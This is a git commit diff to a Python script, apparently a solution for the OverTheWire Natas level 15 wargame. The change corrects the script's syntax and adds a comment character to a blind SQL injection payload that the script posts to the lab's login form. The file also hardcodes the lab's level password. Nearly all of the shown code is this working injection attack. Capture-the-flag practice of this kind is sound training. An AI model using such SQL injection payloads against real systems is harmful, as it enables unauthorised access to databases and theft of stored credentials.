05fe5422b6133ca8252033ed9127ca1e88eb1318
Muhammadreza Haghiri <haghiri75@gmail.com>
2020-12-06 15:13:07 +0330

    One step ahead to the password

--- natas15/hack.py
+++ natas15/hack.py
@@ -6,6 +6,6 @@ password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 url = "http://natas15.natas.labs.overthewire.org/"
 
 session = requests.Session()
-response = session.post(url, data = {"username" = 'natas16" AND password LIKE "%"' }, auth=(username, password))
+response = session.post(url, data = {"username": 'natas16" AND password LIKE "%" #' }, auth=(username, password))
 
 print(response.text)
